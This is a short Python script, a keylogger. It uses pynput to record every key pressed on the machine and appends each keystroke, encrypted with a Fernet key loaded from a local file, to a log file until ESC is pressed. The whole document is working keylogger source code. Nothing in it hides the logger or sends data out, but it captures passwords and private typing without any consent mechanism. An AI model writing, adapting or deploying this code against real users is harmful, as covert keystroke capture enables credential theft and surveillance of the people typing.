from cryptography.fernet import Fernet
from pynput import keyboard

# Load the encryption key
with open("key.key", "rb") as key_file:
    key = key_file.read()

cipher = Fernet(key)
LOG_FILE = "keylog_encrypted.txt"

def encrypt_and_save(data):
    """Encrypt and write keystrokes to the log file."""
    encrypted_data = cipher.encrypt(data.encode())
    with open(LOG_FILE, "ab") as f:  # 'ab' mode to append binary data
        f.write(encrypted_data + b"\n")

def on_press(key):
    """Handles key press events."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            encrypt_and_save(key.char)
        else:
            encrypt_and_save(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Stops the keylogger when ESC is pressed."""
    if key == keyboard.Key.esc:
        return False  # Stop the listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
